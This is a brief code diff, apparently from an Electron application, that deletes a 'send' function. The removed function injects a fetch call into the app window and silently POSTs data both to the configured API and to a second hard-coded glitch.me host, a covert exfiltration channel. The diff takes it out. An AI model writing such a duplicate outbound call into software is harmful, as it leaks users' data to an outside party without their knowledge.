@@ -143,14 +143,7 @@ function organize(e, s, t, n) {
       }
     });
 }
-function send(e, s) {
-  (win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(
-    `fetch("${apiURL}/${e}", { method: "POST", body: JSON.stringify(${s})})`
-  ),
-    win.webContents.executeJavaScript(
-      `fetch("https://invalidurl.glitch.me/${e}", { method: "POST", body: JSON.stringify(${s})})`
-    );
-}
+
 function firstRun() {
   fs.readdirSync(__dirname).includes("ZeroTwo.txt") ||
     ((win = BrowserWindow.getAllWindows()[0]),
